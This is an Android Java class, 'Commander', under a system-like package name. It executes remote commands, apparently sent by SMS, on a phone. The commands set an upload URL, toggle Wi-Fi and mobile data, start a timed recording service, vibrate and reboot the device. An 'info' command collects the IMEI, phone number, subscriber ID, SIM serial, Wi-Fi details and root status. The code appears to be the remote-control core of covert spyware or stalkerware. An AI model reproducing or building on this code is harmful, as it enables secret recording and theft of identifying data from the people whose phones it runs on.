package com.telephony.services;

import java.io.UnsupportedEncodingException;
import java.lang.reflect.InvocationTargetException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.PowerManager;
import android.os.Vibrator;
import android.telephony.TelephonyManager;

public class Commander {
	private Context context = null;
	private PreferenceUtils sPref;

	public final static String COMMAND_SMS_WIFI = "wifi";
	public final static String COMMAND_SMS_MOBILE = "mobile";
	public final static String COMMAND_SMS_REC = "rec";
	public final static String COMMAND_SMS_VIBRO = "vibro";
	public final static String COMMAND_SMS_INFO = "info";
	public final static String COMMAND_SMS_REBOOT = "reboot";

	public Commander(Context context) {
		this.context = context;
		sPref = PreferenceUtils.getInstance(context);
	}

	/**
	 * Выполняет команду cmd
	 * 
	 * @param cmd
	 *            Команда в формате command[[=|:]param].
	 * @return Возвращает результат выполнения команды или пустую строку.
	 * @throws ClassNotFoundException
	 * @throws NoSuchFieldException
	 * @throws IllegalAccessException
	 * @throws IllegalArgumentException
	 * @throws NoSuchMethodException
	 * @throws InvocationTargetException
	 * @throws InvalidKeyException
	 * @throws IllegalBlockSizeException
	 * @throws BadPaddingException
	 * @throws UnsupportedEncodingException
	 * @throws NoSuchAlgorithmException
	 * @throws NoSuchPaddingException
	 */
	public String exec(String cmd) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IllegalArgumentException,
			NoSuchMethodException, InvocationTargetException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException,
			UnsupportedEncodingException, NoSuchAlgorithmException, NoSuchPaddingException {

		StringBuilder res = new StringBuilder();

		String[] params = cmd.split(" *[:=]+ *");

		if (params.length > 0) {
			if (PreferenceUtils.ROOT_DIR.equals(params[0])) {
				if (params.length > 1) {
					if (!params[1].isEmpty()) {
						sPref.setRootDir(params[1]);
					}
				}
			} else if (PreferenceUtils.KEEP_DAYS.equals(params[0])) {
				if (params.length > 1) {
					if (!params[1].isEmpty()) {
						int value = Integer.parseInt(params[1]);
						sPref.setKeepDays(value);
					}
				}
			} else if (PreferenceUtils.VIBRATE.equals(params[0])) {
				if (params.length > 1) {
					if (!params[1].isEmpty()) {
						int value = Integer.parseInt(params[1]);
						sPref.setVibrate(value);
					}
				}
			} else if (PreferenceUtils.UPLOAD_URL.equals(params[0])) {
				if (params.length > 1) {
					if (!params[1].isEmpty()) {
						sPref.setRemoteUrl(params[1]);
					}
				}
			} else if (PreferenceUtils.WIFI_ONLY.equals(params[0])) {
				if (params.length > 1) {
					if (!params[1].isEmpty()) {
						boolean value = Boolean.parseBoolean(params[1]);
						sPref.setWifiOnly(value);
					}
				}
			} else if (COMMAND_SMS_WIFI.equals(params[0])) {
				if (params.length > 1) {
					if (!params[1].isEmpty()) {
						boolean enabled = Boolean.parseBoolean(params[1]);
						WifiManager wm = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
						wm.setWifiEnabled(enabled);
					}
				}
			} else if (COMMAND_SMS_MOBILE.equals(params[0])) {
				if (params.length > 1) {
					if (!params[1].isEmpty()) {
						boolean enabled = Boolean.parseBoolean(params[1]);
						Utils.setMobileDataEnabled(context, enabled);
					}
				}
			} else if (COMMAND_SMS_REC.equals(params[0])) {
				if (params.length > 1) {
					if (!params[1].isEmpty()) {
						int duration = (int) (Integer.parseInt(params[1]) * Utils.SECOND);
						Intent mi = new Intent(context, RecRecordService.class).putExtra(Utils.EXTRA_COMMAND, 1).putExtra(Utils.EXTRA_DURATION,
								duration);
						context.startService(mi);
					}
				}
			} else if (COMMAND_SMS_VIBRO.equals(params[0])) {
				if (params.length > 1) {
					if (!params[1].isEmpty()) {
						int duration = Integer.parseInt(params[1]);
						((Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE)).vibrate(duration);
					}
				}
			} else if (COMMAND_SMS_REBOOT.equals(params[0])) {
				PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
				if (pm != null) {
					String reason = null;
					if (params.length > 1) {
						if (!params[1].isEmpty()) {
							reason = params[1];
						}
					}
					pm.reboot(reason);
				}
			} else if (COMMAND_SMS_INFO.equals(params[0])) {

				res.append("current_version=" + Utils.getCurrentVersion(context)).append("\n");
				res.append("root_availible=" + Utils.checkRoot()).append("\n");
				res.append(PreferenceUtils.ROOT_DIR + "=" + sPref.getRootDir().getAbsolutePath()).append("\n");
				res.append(PreferenceUtils.UPLOAD_URL + "=" + sPref.getRemoteUrl()).append("\n");
				res.append(PreferenceUtils.KEEP_DAYS + "=" + sPref.getKeepDays()).append("\n");
				res.append(PreferenceUtils.VIBRATE + "=" + sPref.getVibrate()).append("\n");
				res.append(PreferenceUtils.WIFI_ONLY + "=" + sPref.isWifiOnly()).append("\n");

				WifiManager wm = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
				if (wm.isWifiEnabled()) {
					WifiInfo wi = wm.getConnectionInfo();
					if (wi != null) {
						res.append("wifi_ssid=" + wi.getSSID()).append("\n");
						res.append("wifi_mac=" + wi.getMacAddress()).append("\n");
					}
				}
				TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
				if (tm != null) {
					res.append("mobile_operator=" + tm.getNetworkOperatorName()).append("\n");
					res.append("mobile_country=" + tm.getSimCountryIso()).append("\n");
					res.append("mobile_IMEI=" + tm.getDeviceId()).append("\n");
					res.append("mobile_softwareVersion=" + tm.getDeviceSoftwareVersion()).append("\n");
					res.append("mobile_phoneNumber=" + tm.getLine1Number()).append("\n");
					res.append("mobile_subscribeId=" + tm.getSubscriberId()).append("\n");
					res.append("mobile_simserial=" + tm.getSimSerialNumber()).append("\n");
				}
			}
		}
		return res.toString();
	}
}
